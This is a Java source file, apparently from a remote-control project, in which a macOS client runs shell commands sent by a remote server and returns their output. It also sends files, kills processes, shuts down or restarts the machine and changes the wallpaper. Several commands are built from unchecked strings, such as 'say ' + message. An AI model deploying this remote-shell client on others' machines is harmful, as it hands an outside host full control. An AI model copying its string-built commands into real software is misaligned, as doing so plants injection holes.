package com.github.connorf.RemoteCommander;

import static com.github.connorf.RemoteCommander.CommandConstants.*;

import java.awt.*;
import java.awt.event.KeyEvent;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Socket;
import java.util.ArrayList;

/**
 * methods for controlling a mac os machine
 * Unfortuantly all the Mac commands have not been tested
 */
public class MacCommandSet extends CommandSet
{
    public MacCommandSet(Socket connection)
    {
        super(connection);
    }

    /**
     * allows the server to control a local shell on the client
     *
     * Remote Shell Protocol
     * =====================
     * 1. send the clients username to the server
     * 2. send the current directory to the server (first time the temp path is sent)
     * 3. read string from the server, if it isn't the terminate string then...
     * 4. run the command provided and update the current directory if needed
     * 5. send any output of the command to the server as a string, or end of command if no output
     */
    @Override
    public void remoteShell()
    {
        sendStringToServer(System.getProperty("user.name"));
        String workingDirectory = getTempPath();
        sendStringToServer(workingDirectory);

        String inputCommand;
        while(!(inputCommand = getCommandFromServer()).equals(REMOTE_SHELL_TERMINATE))
        {
            try
            {
                if(inputCommand.startsWith(REMOTE_SHELL_TRANSFER))
                {
                    String filePathToTransfer = inputCommand.split("\\s+")[1]; // get_file thefile
                    sendFile(new File(workingDirectory + File.separator + filePathToTransfer));
                    continue;
                }

                // runs the systems shell, changes dir to the current one, runs the supplied command, then pwd so we can track our current location (if user ran a dir changing command)
                String[] command = {"/bin/sh", "-c", "cd " + workingDirectory + "; " + inputCommand + " ; pwd;"};
                Process process = getRuntime().exec(command);
                if(process.waitFor() != RETURN_SUCCESS)
                    throw new Exception("Process returned a non-zero value, indicating failure");

                ArrayList<String> fullOutput = getStreamData(new BufferedReader(new InputStreamReader(process.getInputStream()))); // used later so we can get pwd output and track our workingDirectory

                workingDirectory = fullOutput.get(fullOutput.size() - 1).replace("\n", ""); // this is pwd's output. Used to keep track of working dir as we have to have a new process for each command given
                sendStringToServer(workingDirectory);
                fullOutput.remove(fullOutput.size() - 1);
                if(!fullOutput.isEmpty()) // if the cmd created output in stdout we must let server know so it can read the stdout
                {
                    sendStringToServer(REMOTE_SHELL_INDICATE_STDOUT);
                    sendStringToServer(arrayListToString(fullOutput));
                    continue;
                }

                // print any errors back to server
                fullOutput.clear();
                fullOutput = getStreamData(new BufferedReader(new InputStreamReader(process.getErrorStream())));
                if(!fullOutput.isEmpty()) // if cmd created output in stderr we must tell the server so it can read the error
                {
                    sendStringToServer(REMOTE_SHELL_INDICATE_STDERR);
                    sendStringToServer(arrayListToString(fullOutput));
                    continue;
                }

                sendStringToServer(REMOTE_SHELL_INDICATE_END); // no output from the command, so indicate the command is complete
            }
            catch(Exception ioe)
            {
                sendStringToServer(REMOTE_SHELL_INDICATE_STDERR);
                sendStringToServer(ioe.getMessage());
                ioe.printStackTrace();
            }
        }
    }

    @Override
    public void talk(String message)
    {
        try
        {
            getRuntime().exec("say " + message);
        }
        catch(IOException ioe)
        {
            ioe.printStackTrace();
        }
    }

    /**
     * gets the running processes on the clients machine. Uses the `ps` command
     * @return a string containing all the running processes
     * @throws IOException if something went wrong with exec()
     */
    @Override
    public String getRunningProcesses() throws IOException
    {
        String procCommand = "ps -fjH -u " + System.getProperty("user.name"); // we only want our logged in users processes
        Process process = getRuntime().exec(procCommand);
        BufferedReader inFromProcess = new BufferedReader(new InputStreamReader(process.getInputStream()));
        StringBuilder processList = new StringBuilder();
        String line;
        while((line = inFromProcess.readLine()) != null)
            processList.append(line + "\n");

        processList.deleteCharAt(processList.length() - 1); // remove trailing new line character
        return processList.toString();
    }

    @Override
    public boolean killProcess(int pid)
    {
        try
        {
            Process process = getRuntime().exec("kill " + pid);
            if(!wasSuccessful(process))
                return false;
        }
        catch(IOException ioe)
        {
            ioe.printStackTrace();
            return false;
        }
        return true;
    }

    @Override
    public boolean killProcess(String processName)
    {
        try
        {
            Process process = getRuntime().exec("pkill " + processName);
            if(!wasSuccessful(process))
                return false;
        }
        catch(IOException ioe)
        {
            ioe.printStackTrace();
            return false;
        }
        return true;
    }

    /**
     * minimises all open windows: COMMAND+ALT+H+M
     */
    @Override
    public void minimise()
    {
        Robot robot = getRobot();
        robot.keyPress(KeyEvent.VK_META);
        robot.keyPress(KeyEvent.VK_ALT);
        robot.keyPress(KeyEvent.VK_H);
        robot.keyPress(KeyEvent.VK_M);
        robot.keyRelease(KeyEvent.VK_META);
        robot.keyRelease(KeyEvent.VK_ALT);
        robot.keyRelease(KeyEvent.VK_H);
        robot.keyRelease(KeyEvent.VK_M);
    }

    /**
     * Mac doesn't seem to support any way of rotating the screen dynamically
     * @param direction the direction to rotate the screen (left, right, normal, inverted)
     * @return always false for Mac
     */
    @Override
    public boolean rotate(String direction)
    {
        return false;
    }

    @Override
    public boolean eject()
    {
        try
        {
            Process process = getRuntime().exec("drutil eject internal");
            if(!wasSuccessful(process))
                return false;
        }
        catch(IOException ioe)
        {
            return false;
        }
        return true;
    }

    @Override
    public void shutdown() throws IOException
    {
        getRuntime().exec("osascript -e 'tell app \"System Events\" to shut down'");
    }

    @Override
    public void restart() throws IOException
    {
        getRuntime().exec("osascript -e 'tell app \"System Events\" to restart'");
    }

    /**
     * sets the wallpaper on the system
     * @param wallpaper the file that will be used as the wallpaper
     */
    @Override
    public boolean setWallpaper(File wallpaper)
    {
        try
        {
            Process process = getRuntime().exec("osascript -e 'tell application \"Finder\" to set desktop picture to POSIX file \"" + wallpaper.getAbsolutePath() + "\"'");
            if(!wasSuccessful(process))
                return false;
        }
        catch(IOException ioe)
        {
            System.err.println("Failed to set wallpaper");
            ioe.printStackTrace();
            return false;
        }
        return true;
    }
}
